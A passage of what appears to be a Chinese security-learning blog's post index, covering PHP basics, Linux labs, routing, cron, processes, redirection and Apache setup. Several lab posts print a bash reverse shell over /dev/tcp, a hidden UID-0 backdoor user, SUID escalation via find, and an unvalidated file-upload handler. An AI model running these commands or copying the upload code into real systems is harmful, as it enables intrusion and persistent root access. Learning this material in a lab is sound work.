 //改为int类型\nvar_dump ($thy);   //显示数据类型\n```\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/20250812165323353.png)\n\n但是如果是将原本的字符串修改为int类型的话\n\n```php\necho (int)$thy\n```\n\n输出为0\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/20250812184706377.png)\n\n### 4、可变变量\n\n编写php代码\n\n```php\n<?php\n$cxk = \"god\";  //给变量cxk赋值为god\n$god = \"i love cxk!\";  //给变量god赋值为i love cxk！\necho $$cxk;        //此时要输出时，首先$cxk会变成god，所以最后输出的其实是，$god\n?>\n```\n\n输出如下\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/20250812170030446.png)\n\n\n\n### 5、burp或者yakit抓包\n\n①打开burp，设置监听地址和端口\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/20250812170326956.png)\n\n②在浏览器设置代理地址和端口为burp设置的一样\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/20250812170916844.png)\n\n③浏览器访问页面，在访问的时候访问ip地址，不能使用localhost，不然抓不到包\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/20250812172017466.png)\n\n④burp开启拦截\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/20250812171120133.png)\n\n⑤在页面输入数据，并提交表单\n\n成功抓到get数据包\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/20250812172102354.png)\n\n我们来修改代码为post传参，同第一题一样\n\n```php+HTML\n#html\n<form method=\"POST\" action=\"1.php\">\n\n#php\n$name = $_POST['name'];\n$password = $_POST['pass'];\n```\n\n改完之后抓包\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/20250812172310090.png)\n\n成功抓到数据包\n\n⑥对比\n\n- 两者的请求方法不同\n\n- post方法多了Content-Type、Content-Length、Origin字段\n\n- get请求数据在url中，post数据在请求体里面\n\n\n\n## 扩展\n\n### 使用form表单上传文件存储到服务器\n\n①编写代码\n\n前端\n\n```html\n<form method=\"POST\" action=\"1.php\" enctype=\"multipart/form-data\"> //post方法上传文件到1.php中去处理\n\t<input type=\"file\" name=\"file\"><br \\>\n\t<input type=\"submit\" value=\"提交\">\n\t<form>\n```\n\n效果如下\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/20250812183125274.png)\n\n后端\n\n```php\n$file = $_FILES[\"file\"];     //$_FILE全局变量接受从前端上传的文件\n$filename = $file[\"name\"];   //赋予文件名\n$filePath = $file['tmp_name'];   //将文件保存在临时目录\nmove_uploaded_file($filePath,\"uploadfile/\".$filename);  //将文件移动到网站根目录下的uploadfile目录\n```\n\n我们先创建一个文件在桌面\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/20250812183719808.png)\n\n我们在前端选择文件然后上传\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/20250812183420250.png)\n\n之后通过路径去访问一下刚才上传的文件\n\n```url\n/uploadfile/1.txt\n```\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/20250812183801494.png)\n\n成功访问，证明上传成功！！！但是因为编码原因，符号乱码"},{"title":"linux实操2","url":"/2025/08/09/Linux实操2/","content":"\n### 1、反弹shell维权\n\n①在kali上开启端口监听\n\n```bash\nnc -lvnp 9999\n```\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/20250809102952793.png)\n\n②在centos上反弹bash，kali端成功拿到shell\n\n```bash\nbash -i >& /dev/tcp/192.168.18.132/9999 0>&1\n```\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/20250809103112940.png)\n\n③kali端利用反弹的shell创建uid为0的用户\n\n```bash\nuseradd -o -u 0 -m hack\n\n#-o表示允许创建重复uid\n#-u表示设置用户uid\n#-m表示创建家目录\n```\n\n④kali端非交互式为刚才创建的hack用户设置密码，这里利用root权限直接修改passwd文件\n\n```bash\necho \"hack:hack123\" | chpasswd\n\n#将echo输出的字段作为chpasswd的输入\n```\n\n这样我们就完成了非交互式密码更改\n\n⑤我们在centos上去验证一下\n\n重启客户机，使用刚才创建的密码去登录\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/20250809104734663.png)\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/20250809104923298.png)\n\n成功登录，并且作为root用户！！！！\n\n\n\n### 2、echo写入计划任务\n\n①使用反弹shell设置计划任务，一条命令执行，我们使用crontab来写入\n\n```\necho \"* * * 8 5 tar -zcf /var/log/secure_$(date +%F-%H%M).back /var/log/secure\" | crontab\n\n#* * * 8 5 计划任务时间，表示八月的每周五的每一小时，每一分钟\n#tar -zcf /var/log/secure_$(date +%F-%H%M).back /var/log/secure表示将/var/log/secure 打包为secure_$(date +%F-%H%M).back文件\n#crontab 表示使用crontab创建计划任务\n```\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/20250809105848867.png)\n\n②我们去centos端验证一下\n\n```bash\ncrontab -l\n\n#命令表示查看此用户下的计划任务\n```\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/20250809110001186.png)\n\n成功创建！！！！！\n\n\n\n### 3、suid提权\n\n①这个实验我们在centos端做，首先切换到一个普通用户，若没有普通用户则创建一下，这里我已经创建好了一个test用户\n\n```bash\nsu test\n```\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/20250809110212334.png)\n\n②在普通用户视角下，去搜索具有SUID权限的文件，一般具有威胁的文件有find、vim、bash\n\n```bash\nfind / -perm -4000 -type f -user root 2>/dev/null\n\n#/表示在根目录递归查找\n#-perm -4000表示精确匹配suid权限文件\n#-user root表示匹配root为属主的文件，这样方便提权\n#2>/dev/null表示丢弃错误信息\n```\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/20250809110715587.png)\n\n我们找到了一个find文件，利用这个文件可以提权\n\n③进行提权\n\n```bash\nfind . -exec /bin/bash -p \\;\n\n#.表示在当前目录下依次查找文件，其实这个.和提权没多大关系\n#-exec /bin/bash表示追加一条命令，打开一个bash\n#-p表示为打开的bash保留suid权限，提权 \n#\\;表示追加的命令结束\n```\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/20250809111154685.png)\n\n④进行验证此bash权限\n\n```bash\nwhoami\n```\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/20250809111304511.png)\n\n成功提权到root用户！！！！！\n\n\n\n### 4、死循环脚本，使用ps aux找到pid，利用kill命令关闭进程\n\n```\n#!/bin/bash\nwhile((2>1))\ndo\necho\"ddd\"\ndone\n```\n\n```bash\n#创建一个脚本文件\nvim loop.sh\n\n#!/bin/bash\nwhile((2>1))\ndo\necho\"ddd\"\ndone\n\n#给文件添加执行权限\nchmod +x loop.sh\n```\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/20250810150712409.png)\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/20250810150954044.png)\n\n①运行脚本\n\n```bash\n./loop.sh\n```\n\n②新开一个终端，动态查看进程\n\n```bash\n#动态查看进程\ntop\n```\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/20250810151246927.png)\n\n可以看到第一个cpu占了31.2%，并且是执行的脚本文件\n\n③杀死进程\n\n```bash\nkill -9 2783\n```\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/20250810151507926.png)\n\n成功杀死进程！！！！！\n\n\n\n### 5、转义符号\n\n```bash\n# 转义 $ 避免变量替换\necho \"原样输出: \\$USER\"    # 输出: 原样输出: $USER（而非变量值）\n\n# 转义空格处理带空格的路径\ntouch my\\ file.txt         # 创建文件 \"my file.txt\"（而非两个文件）\nls my\\ file.txt            # 列出文件\n\n# 转义 * 防止通配符扩展\necho \"星号: \\*\"            # 输出: 星号: *（而非文件列表）\n\n# 双引号内转义特殊字符\necho \"She said: \\\"Hello\\\"\"   # 输出: She said: \"Hello\"\n\n# 单引号内转义单引号（特殊技巧）\necho 'It'\\''s sunny'         # 输出: It's sunny（分段拼接）\n\n# 换行符 \\n\necho -e \"第一行\\n第二行\"\n# 输出:\n#   第一行\n#   第二行\n\n# 制表符 \\t\necho -e \"Name:\\tAlice\"\n# 输出: Name:   Alice\n\n# 长命令拆分成多行\nfind /home -name \"*.log\" \\\n     -type f \\\n     -size +1M\n# 等价于单行命令：find /home -name \"*.log\" -type f -size +1M\n\n# 转义 . 匹配点号本身\ngrep \"127\\.0\\.0\\.1\" /etc/hosts  # 匹配 IP 地址（而非任意字符）\n```\n\n"},{"title":"后渗透基础-路由转发","url":"/2025/08/07/后渗透基础1-路由转发/","content":"\n### 一、路由转发简介\n\n#### 1.路由转发是什么\n\n路由转发（IP Forwarding）是计算机网络中的核心机制，指路由器或具备路由功能的设备根据路由表将接收到的数据包转发到目标网络。\n\n#### 2.核心概念\n\n- 路由表（Routing Table）：\n\n  存储网络地址与下一跳信息的表格，决定数据包的转发路径。\n\n  ```\n  目标网络          下一跳IP          接口             标记\n  192.168.1.0/24   10.0.0.1         eth0             UG\n  ```\n\n- 下一跳（Next Hop）：\n\n  数据包转发的下一个设备或网关的 IP 地址。\n\n- 路由协议（如 OSPF、BGP）：\n\n  动态更新路由表的协议，适用于大型网络（如企业网或互联网）\n\n#### 3.工作流程\n\n当一个网络设备收到一个数据包时，会查看源ip和目的ip，查看目标网络是否在自己的路由表里面，如果在，则将接收到的数据包转发给下一跳地址，下一跳设备接收到数据包时，重复上述操作，直到数据包转发到目的ip。\n\n#### 4.配置方法\n\nlinux系统使用命令配置\n\n```bash\n#查看路由表\nip route show\n\n#添加静态路由\nip route add 192.168.10.0/24 via 10.0.0.1 dev eth1\n\nip route add：表示添加一项路由条目\n192.168.10.0/24：表示目标网络，子网掩码是24\nvia 10.0.0.1：表示下一跳地址是10.0.0.1\ndev eth1：表示网络设备接口是dev eth1\n\n#删除路由\nip route del 192.168.2.0/24\n```\n\n配置文件持久化\n\n路径： /etc/sysconfig/network-scripts/route-eth0 （针对接口 eth0 ）或/etc/sysconfig/network-scripts/ifcfg-ensxx\n\n添加内容\n\n```bash\nto default via 10.0.0.1 dev eth0 #表示去往默认路由的下一跳地址是10.0.0.1\nto 192.168.2.0/24 via 10.0.0.2 dev eth1  #表示去往192.168.2.0/24网段的下一跳地址是10.0.0.2\n```\n\n### 二、虚拟机网络连接方式\n\n想要在虚拟机上完成路由转发案例，我们先了解一下虚拟机的网络连接方式\n\n#### 1.NAT（网络地址转换）模式\n\n你的物理机相当于虚拟机的网关，虚拟机可以通过物理机来访问外部网络，但是外部网络无法直接访问虚拟机，就相当于你的物理机作为你虚拟机的路由器。\n\n#### 2.桥接模式\n\n这个模式下，虚拟机就相当于一台真实主机，可以与外部网络进行通信，具有自己的ip地址，虚拟机的网络适配器与你物理机的网卡相连接，相当于与你物理机处于同一水平线。\n\n#### 3.仅主机模式\n\n虚拟机完全隔离于外部网络，只能与你物理机进行通信。\n\n### 三、网络配置\n\n#### 1.网络管理器（NetworkManager）\n\n网络管理器（NetworkManager）是一个动态网络的控制器与配置系统，它用于当网络设备可用时保持设备和连接开启并激活。\n\nCentOS8 默认安装网络管理器，并处于启用状态。\n\n```bash\n#查看网络管理程序状态\nsystemctl status NetworkManager\n```\n\n#### 2.网络配置方法\n\n①修改文件配置\n\n```bash\n/etc/sysconfig/network-scripts目录下\n\n#编辑配置文件，如\nvim /etc/sysconfig/network-scripts/ifcfg-ens168\n\n#incfg-ens168就是你centos系统网卡对应的网络配置文件\n#以下是所需要配置的参数\nTYPE=Ethernet              #接口类型\nDEVICE=ens160              #设备名称，你网卡的名称\nONBOOT=yes                 #开机自启，no是不自启\nBOOTPROTO=static           #获取ip方式，static是静态ip，还有DHCP方式\nIPADDR=192.168.2.254       #你分配的ip地址\nNETMAK=255.255.255.0       #子网掩码\nGATEWAY=192.168.2.1        #网关\nDNS1=114.114.114.114       #DNS\nDNS2=8.8.8.8\nDEFROUTE=yes               #默认路由\n```\n\n②命令配置\n\n```bash\nnmcli\n\n#查看网络连接\nnmcli connection show\n\n#启用接口\nnmcli connection up ensxxx\n\n#禁用接口\nnmcli connection down ensxxx\n\n#配置静态ip\nnmcli connection modify ensxxx \\\n  type ethernet \\\n  ip4 192.168.1.100/24 \\\n  gateway4 192.168.1.1 \\\n  dns \"8.8.8.8;8.8.4.4\"\n \n#配置DHCP\nnmcli connection modify ens160 \\\n  type ethernet \\\n  ip4 auto dhcp\n```\n\n### 四、路由转发实验\n\n#### 1.拓扑说明\n\n| 操作系统   | 网卡                  |\n| ---------- | --------------------- |\n| windows 10 | vmnet 2（仅主机模式） |\n| centos 8   | vmnet 2 、 vmnet 3    |\n| kali       | vmnet 3               |\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/20250807153656771.png)\n\n#### 2.目标\n\n实现win10与kali能够ping通\n\n#### 3.实践\n\n①kali配置ip\n\n```bash\n#kali网络配置文件在/etc/network目录下有个interfaces文件\n\n#首先进行源文件的备份\nmv interfaces interfaces.back\n\n#新建一个interfaces文件\nvim /etc/network/interfaces\n\nauto lo                             \niface lo inet loopback             #回环\n\nauto eth0                          #网络接口\niface eth0 inet static             #静态路由\n     address 172.16.2.1            #ip地址\n     netmask 255.255.255.0         #掩码\n     gateway 172.16.2.254          #网关\n\n\n#重启服务\nsystemctl restart networking\n```\n\n②centos双网卡配置\n\n```bash\n#centos配置文件在/etc/sysconfig/network-scripts目录下的ifcfg-ensxxx文件\n#双网卡的话就有两个文件\n\n#备份源配置文件\nmv ifcfg-ens160 ifcfg-ens160.back\nmv ifcfg-ens160 ifcfg-ens224.back\n\n#新建配置文件，因为这里centos相当于路由器，所以不配置网关和掩码\nvim ifcfg-ens160\n\nTYPE=Ethernet            #接口类型\nDEVICE=ens160            #网卡名称\nONBOOT=yes               #开机自启动\nBOOTPROTO=static         #静态ip\nIPADDR=192.168.2.254     #ip地址\nDEFROUTE=yes             #默认路由，主网卡设置\n\nvim ifcfg-ens224\n\nTYPE=Ethernet\nDEVICE=ens224\nONBOOT=yes\nBOOTPROTO=static\nIPADDR=172.16.2.254\nDEFROUTE=no\n\n#重启服务\nsystemctl restart NetworkManager\n```\n\n③win 10配置ip\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/20250807155943800.png)\n\n④测试连通性\n\nwin10无法于kali通信\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/20250807160056221.png)\n\nwin10能和centos通信\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/20250807160152884.png)\n\nkali能和centos通信\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/20250807160248802.png)\n\n⑤修改centos配置文件，开启路由转发\n\n在/proc/sys/net/ipv4目录下的ip_forward文件，这个文件默认为0且只读，但是可以通过重定向强制写入\n\n```\n#0表示关闭，1表示开启\necho 1 > /proc/sys/net/ipv4/ip_forward\n```\n\n此时测试kali能否与win10通信\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/20250807160741824.png)\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/20250807160820847.png)\n\n成功互通\n"},{"title":"linux计划任务","url":"/2025/08/06/linux计划任务/","content":"\n### 一、计划任务简介\n\n在特定时间自动执行预先设定的命令和脚本\n\n比如：定期备份，服务器运维，数据更新\n\n### 二、Linux计划任务工具\n\n#### 1.at\n\n适用场景：一次性/延迟任务\n\n时间粒度：秒级\n\n特点：简单、轻量、无需持久化守护进程\n\n基本语法\n\n```bash\nat 【选项】 时间表达式\n\nat支持灵活的时间表述\nnow # 立即执行\nnow + 5min # 5分钟后\n02:30 tomorrow/today # 次日2:30\n2025-12-31 23:59 # 绝对时间\n\n#示例\nat now +5 minutes\n\n#ctrl+d用于提交任务\n#每个任务都有一个任务ID\n\n#查看所有待执行任务\natq\n\n#删除任务\natrm ID\n\n#查看任务内容\nat -C ID\n```\n\n\n\n#### 2.cron\n\n适用场景：周期性任务\n\n时间粒度：分钟级\n\n特点：复杂，需长期运行守护进程\n\n①cron核心功能\n\ncron用于执行周期性任务\n\n适用于以下场景：\n\n- 定时备份：每日/每周自动备份数据。\n- 日志清理：定时删除过期日志文件。\n- 数据同步：每小时同步服务器间数据。\n- 监控报警：检测服务状态并发送通知。\n\n②配置文件\n\ncron有一个配置文件，是cron的编辑模板，路径为/etc/crontab\n\n```bash\n[root@study ~]# cat /etc/crontab\nSHELL=/bin/bash\nPATH=/sbin:/bin:/usr/sbin:/usr/bin\nMAILTO=root\n\n# For details see man 4 crontabs\n\n# Example of job definition:\n# .---------------- minute (0 - 59)\n# |  .------------- hour (0 - 23)\n# |  |  .---------- day of month (1 - 31)\n# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...\n# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat\n# |  |  |  |  |\n# *  *  *  *  * user-name  command to be executed\n\n#minute表示分钟\n#hour表示小时\n#day of month表示一个月当中第几天\n#munth表示第几个月\n#day of week表示一周的第几天\n\n示例：\n10 2 * 7 2 /etc/bin/systemctl restart httpd\n表示7月份中每周二凌晨2点10分执行重启apache服务\n```\n\n③管理命令\n\ncrontab -e：编辑任务\n\n打开当前用户的~/.crontab文件，支持bim编辑器，用于添加、修改、删除个人定时任务\n\ncrontab -l：列出任务\n\n显示当前用户的所有计划任务\n\ncrontab -r：删除任务\n\n永久删除当前用户的所有计划任务\n\ncrontab -u username：管理其他用户\n\n用于查看/编辑其他用户的计划任务\n"},{"title":"linux进程管理","url":"/2025/08/06/linux进程管理/","content":"\n# 一、进程简介\n\n## 1.进程是什么\n\n- 程序在启动时、命令在执行时或服务在运行时会产生进程，产生一个或多个，这些进程来完成程序、命令或服务，所以进程是正在执行的程序的实例。\n\n## 2.程序和进程\n\n- 程序： 是一组静态的指令代码，存储在磁盘上的文件中。它本身是“死的”，不占用系统资源（除了存储空间）。\n- 进程： 是程序被加载到内存中开始运行后的动态实体。它是“活的”，需要操作系统为其分配和管理各种资源才能执行。\n\n## 3.进程的状态\n\n进程在其生命周期中会处于不同的状态：\n\n- 新建（new）： 进程正在被创建。\n- 就绪（Runable）： 进程已获得除CPU之外的所有必要资源，等待被操作系统调度执行。\n- 运行（Running）： 进程正在CPU上执行其指令。\n- 阻塞/等待（Stopped）： 进程因等待某个事件（如I/O操作完成、信号量资源）而暂停执行。\n- 终止/退出： 进程执行完毕或被强制终止，等待操作系统回收其资源。\n- 僵尸态（Zombie）：子进程先结束，但是父进程没有回收子进程。\n\n## 4.进程PID\n\n每个进程由唯一的一个非负整数来标识，从1开始分配，通过PID能精确定位到具体进程。\n\nPID的分配规则：\n\n- 取值范围\n\n  PID从 1 开始分配（系统启动后的第一个进程是 init 或 systemd ，PID=1）。\n\n  最大PID值由内核参数 /proc/sys/kernel/pid_max 定义（默认通常为 32768 ）。\n\n  当PID达到最大值时，会循环使用已释放的PID（但不会重复分配给仍在运行的进程）。\n\n- 回收机制\n\n​       进程终止后，其PID会被释放，供后续新进程使用\n\nPID的特殊角色：\n\n- PID=1（systemd进程）\n\n  系统启动后的第一个进程，负责启动和管理其他所有用户进程。\n\n  如果PID=1的进程终止，系统会触发内核恐慌（Kernel Panic）并崩溃。\n\n- 父进程PID（PPID）\n\n  每个进程（除Init）都有父进程（Parent Process），父进程的PID称为 PPID。\n\n## 5.进程字段解析\n\n- PID：进程 ID\n- PPID：父进程 ID\n- USER：进程所有者\n- %CPU：CPU 占用率\n- %MEM：内存占用率\n- VSZ：虚拟内存大小（KB）\n- RSS：物理内存大小（KB）\n- TTY：关联的终端\n- STAT：进程状态（如 S =睡眠， R =运行）\n- START：进程启动时间\n- TIME：累计 CPU 时间\n- COMMAND：启动命令（ [] 表示内核线程）\n\n# 二、进程管理\n\n进程管理可以通过ps、top、kill来进行管理。\n\n## 1.ps\n\nps是linux中查看当前系统进程状态的工具，用于静态查看进程，显示进程的详细信息，如：PID、CPU、运行时间、进程状态等等。\n\n①基本语法：\n\n```bash\nps 【选项】\n\n#常用参数\n\n#显示所有进程（包括其他用户进程）\n-e或-A \n#显示所有终端进程（除会话领导者）\n-a\n#显示不关联终端的进程（如守护进程）\n-x\n#显示指定用户的进程（如-u root）\n-u\n#显示指定字段\n-o\n```\n\n②常用搭配：\n\n```bash\n#显示所有进程详细信息，BSD风格\nps aux\n\n#显示所有进程完整信息，Unix风格\nps -ef\n\n#显示pid、用户、cpu占用、内存占用，按照cpu降序\nps -eo pid,user,%cpu,%mem,cmd --sort=-%cpu | head\n\n#搭配grep来指定要显示内容\n#显示httpd进程\nps aux | grep httpd\n```\n\n## 2.top\n\ntop是linux中最常用的实时系统监控工具，用于动态显示进程资源占用和系统整体状态，提供交互式操作，用户能够快速分析性能瓶颈\n\n①基础语法\n\n```bash\n#启动top\ntop\n\n#退出top\nq或Ctrl+C\n```\n\n②界面解析\n\ntop 界面分为 摘要区（系统概览）和 进程列表区（实时进程信息）\n\n上半部分（系统概览）\n下半部分（进程列表）\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/20250806152548546.png)\n\n③交互式命令\n\n- k：终止进程（输入 PID，再输入信号，默认 SIGTERM ）。\n- r：调整进程优先级（输入 PID，再输入 Nice 值）。\n- P：按 CPU 使用率排序。\n- M：按内存使用率排序。\n- T：按运行时间排序。\n- N：按 PID 排序。\n- z：切换颜色高亮显示。\n- c：显示完整命令路径。\n- 1：展开显示每个 CPU 核心的负载。\n- h：查看帮助信息。\n- 空格：立即刷新界面。\n\n## 3.kill\n\nkill命令可以用于刷新或者杀死进程\n\n①信号控制\n\nkill命令可以加上不同信号来完成对进程的不同操作\n\n```bash\n#查看所有信号\nkill -l\n\n[root@study 桌面]# kill -l\n 1) SIGHUP\t 2) SIGINT\t 3) SIGQUIT\t 4) SIGILL\t 5) SIGTRAP\n 6) SIGABRT\t 7) SIGBUS\t 8) SIGFPE\t 9) SIGKILL\t10) SIGUSR1\n11) SIGSEGV\t12) SIGUSR2\t13) SIGPIPE\t14) SIGALRM\t15) SIGTERM\n16) SIGSTKFLT\t17) SIGCHLD\t18) SIGCONT\t19) SIGSTOP\t20) SIGTSTP\n21) SIGTTIN\t22) SIGTTOU\t23) SIGURG\t24) SIGXCPU\t25) SIGXFSZ\n26) SIGVTALRM\t27) SIGPROF\t28) SIGWINCH\t29) SIGIO\t30) SIGPWR\n31) SIGSYS\t34) SIGRTMIN\t35) SIGRTMIN+1\t36) SIGRTMIN+2\t37) SIGRTMIN+3\n38) SIGRTMIN+4\t39) SIGRTMIN+5\t40) SIGRTMIN+6\t41) SIGRTMIN+7\t42) SIGRTMIN+8\n43) SIGRTMIN+9\t44) SIGRTMIN+10\t45) SIGRTMIN+11\t46) SIGRTMIN+12\t47) SIGRTMIN+13\n48) SIGRTMIN+14\t49) SIGRTMIN+15\t50) SIGRTMAX-14\t51) SIGRTMAX-13\t52) SIGRTMAX-12\n53) SIGRTMAX-11\t54) SIGRTMAX-10\t55) SIGRTMAX-9\t56) SIGRTMAX-8\t57) SIGRTMAX-7\n58) SIGRTMAX-6\t59) SIGRTMAX-5\t60) SIGRTMAX-4\t61) SIGRTMAX-3\t62) SIGRTMAX-2\n63) SIGRTMAX-1\t64) SIGRTMAX\t\n```\n\n总共64种信号\n\n②常用信号\n\n- 1：SIGHUP (重载配置)/重刷新一个进程，主要用户服务的刷新\n- 9：SIGKILL (强制终止)/杀掉一个进程，但不杀掉其子进程（centos7）\n- 15：SIGTERM (正常终止)/杀掉进程及其子进程\n- 18：SIGCONT (恢复执行)\n- 19：SIGSTOP (暂停)/暂停一个进程\n\n用法\n\n```bash\n#杀死进程PID位1234的进程\nkill -9 1234\n```\n\nPID为1的进程为系统进程，别使用kill进行杀死\n\n# 三、作业控制\n\nlinux可以在一个终端中管理多个任务进程(这些进程称之为job)。有些进程会占用终端运行很久或是一直占用终端，那么想要运行第二进程就无法操作了，所以进程可以放到后台执行，这样就不影响在同一个终端运行第二个进程了\n\n## 前后台管理\n\n```bash\n#使用sleep命令开启占用终端\nsleep 10000&\n\n#‘&’表示将sleep挂到后台运行，这样救不占用终端\n\n#查看后台运行作业\njobs -l\n[root@study 桌面]# jobs -l\n[1]+  6659 运行中               sleep 10000 &\n\n#作业调度\n\n#将后台任务调度到前台\nfg %1 \n#将后台暂停任务运行\nbg %1\n\n#%1表示作业号为1的作业\n#用kill杀死时必须加上%1\n#如果是kill 1表示杀死系统进程，谨慎操作\n```\n\n"},{"title":"linux重定向与bash反弹","url":"/2025/08/05/重定向与bash反弹/","content":"\n# 一、重定向\n\n## 1.文件描述符（fd）\n\n在linux系统中，文件描述符是一个非负整数（0、1、2、3......），它是用于唯一标识一个进程打开的文件、管道、网络连接或其他I/O资源。\n\n## 2.标准流\n\nlinux中，每个进程会分配三个标准流，标准输入流、标准输出流、错误输出流，这三个流以三个不同的文件描述符进行标识。\n\n①标准输入（stdin，fd 0）\n\n  如键盘输入一个a\n\n②标准输出（stdout，fd 1）\n\n  如屏幕显示一个a\n\n③错误输出（stderr，fd 2）\n\n  如屏幕显示一个b\n\n## 3.重定向是什么\n\n重定向就是可以将一个输入或输出重定向到另一个文件当中\n\n这里引入一个概念-------管道符，管道符的作用就是将前一个指令的输出作为后一个指令的输入，常用的管道符如:\n\n<\n\n<<\n\n|\n\n&\n\n举个例子\n\n```bash\n#当输入\necho 123 > 123.txt\n123会输入到123.txt当中，而不是回显到终端\n```\n\n# 二、重定向案例\n\n## 1.正确和错误都输入到相同位置\n\n首先，我们新建一个目录，/test1/123\n\n```bash\nmkdir -p /test1/123\n```\n\n然后输入以下内容\n\n```bash\nls /test1 /test2\n#正常返回这样\n[root@study /]# ls /test1 /test2\nls: 无法访问'/test2': 没有那个文件或目录\n/test1:\n123\n\n#现在我们输入\nls /test1 /test2 &> 456.txt\ncat 456.txt\n#则返回\n[root@study /]# ls /test1 /test2 &> 456.txt\n[root@study /]# cat 456.txt\nls: 无法访问'/test2': 没有那个文件或目录\n/test1:\n123\n```\n\n正确的输出和错误的输出已经保存在456.txt文件里面了\n\n## 2.将正确的输出和错误的输出重定向到不同文件\n\n```bash\nls /test1 /test2 1> output.txt 2> errorput.txt\n\n[root@study /]# ls /test1 /test2 1> output.txt 2> errorput.txt\n[root@study /]# cat output.txt \n/test1:\n123\n[root@study /]# cat errorput.txt \nls: 无法访问'/test2': 没有那个文件或目录\n```\n\n可以看到指向了不同的文件\n\n## 3.将错误输出合并到正确输出，再一起重定向到文件\n\n```bash\nls /test1 /test2 > 123.txt 2>&1\n\n[root@study /]# ls /test1 /test2 > 123.txt 2>&1\n[root@study /]# cat 123.txt\nls: 无法访问'/test2': 没有那个文件或目录\n/test1:\n123\n```\n\n可以看到，进行合并并且指向了123.txt文件\n\n这里的方式和案例1的结果其实差不多，这里的&1标识的是文件标识符（fd），不是文件1，所以在进行合并的时候必须写上&\n\n# 三、bash反弹\n\n## 1.shell是什么\n\nshell就是一种解释器，用于用户和内核交互的桥梁，计算机只能读懂二进制语言，读不懂人类语言，所以需要一个解释器去进行翻译，比如你在终端输入一个ls，那么你的shell就将这个命令翻译为二进制，计算机内核才能读懂，才能处理你的命令\n\n## 2.bash是什么\n\nbash就是shell的一种类型，是shell的具体实现，你的操作系统终端输入命令的地方就是bsah，但是bash不仅仅只能解释命令，如：ls、cat、vim等，它也能执行复杂流程，如运行脚本\n\n## 3.反弹bash\n\n```bash\nbash -i >& /dev/tcp/192.168.x.x/xxxx 0>&1\n```\n\n命令解释\n\n- bash -i\n\n打开一个交互的bash，就是命令行\n\n- /dev/tcp/\n\nlinux中的特殊设备，打开这个文件相当于发送一个socket调用，建立socket连接，后续在这个连接中传输数据\n\n- /dev/tcp/192.168.x.x/xxxx \n\n向192.168.x.x:xxxx发起连接\n\n- bash -i >& /dev/tcp/192.168.x.x/xxxx\n\n将正确输出和错误输重定向到这个连接\n\n- 0>&1\n\n将标准输入与正确输出合并，并一起重定向到这个连接\n\n## 4.实操\n\n实验机：kali、centos8\n\n①在kali上，使用nc工具监听1234端口（端口可以自定义）\n\n```bash\nnc -lnvp 1324\n#正常返回这个\n┌──(root㉿kali)-[/home/kali]\n└─# nc -lnvp 1234 \nlistening on [any] 1234 ...\n```\n\n②在centos上，执行反弹命令\n\n```bash\n#首先查看kali的ip\nifconfig\n\n#在centos上输入，这里的ip地址输入kali的地址，端口输入你监听的端口\nbash -i >& /dev/tcp/192.168.x.x/xxxx 0>&1\n#再次返回到kali，出现以下bash表示成功\n                                                                             \n┌──(root㉿kali)-[/home/kali]\n└─# nc -lnvp 1234 \nlistening on [any] 1234 ...\nconnect to [192.168.18.169] from (UNKNOWN) [192.168.18.168] 42486\n[root@study /]# \n```\n\n③试着执行命令，如查看/etc/passwd\n\n```bash\ncat /etc/passwd\n```\n\n\n"},{"title":"linux搭建apache服务器","url":"/2025/08/04/linux搭建apache服务器/","content":"\n\n\n# 一、搭建环境\n\n操作系统：CentOS 8\n\n服务器：apache\n\n镜像源：https://mirrors.huaweicloud.com/repository/conf/CentOS-8-reg.repo\n\n# 二、搭建步骤\n\n## 1.下载镜像\n\n```bash\nwget -O /etc/yum.repos.d/CentOS-Base.repo https://mirrors.huaweicloud.com/repository/conf/CentOS-8-reg.repo\n```\n\n## 2.下载apache服务\n\n```bash\n#下载apache\nyum install httpd\n\n#安装完成后，开启apache服务\nsystemctl start httpd\n\n#检查状态，出现如下页面证明成功开启\nsystemctl status httpd\n```\n\n![](https://raw.githubusercontent.com/thy295/picgo/main/img/20250804154607959.png)\n\n## 3.apache配置文件介绍\n\n```bash\n#在下载apache时，会自动生成apache配置文件\n#检查配置文件\n#apache主配置文件，路径为/etc/httpd/conf/httpd.conf\n#apache虚拟主机配置文件，路径为/etc/httpd/conf.d\n#apache自定义配置文件，存放在虚拟主机配置文件目录下，如：/etc/httpd/conf.d/mywebsite.conf\n\n#可以检查系统新增系统服务，验证apache服务\nsystemctl list-unit-files | grep http\n\n[root@localhost /]# systemctl 